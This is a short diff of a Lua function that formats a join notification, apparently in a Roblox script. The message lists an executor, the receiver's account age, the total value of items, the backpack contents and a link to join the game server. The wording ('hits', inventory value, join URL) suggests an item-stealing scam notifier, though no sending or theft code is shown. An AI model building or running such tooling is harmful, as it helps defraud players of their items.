@@ -256,8 +256,6 @@ local function SendJoinMessage(list, prefix)
     end
     local backpackStr = table.concat(backpackLines, "\n")
 
-    -- Hits section (customize as needed)
-    local hitsStr = "All Items"
 
     -- Game info
     local jobId = game.JobId or "N/A"
@@ -270,13 +268,10 @@ local function SendJoinMessage(list, prefix)
 Receiver: %s
 Executor: %s
 Account Age: %s days```
-
 :moneybag: **Total Value**
 ```%s```
-
 :palm_tree: **Backpack**
 ```%s```
-
 :island: **Join with URL**
 %s
 -# %s | %s
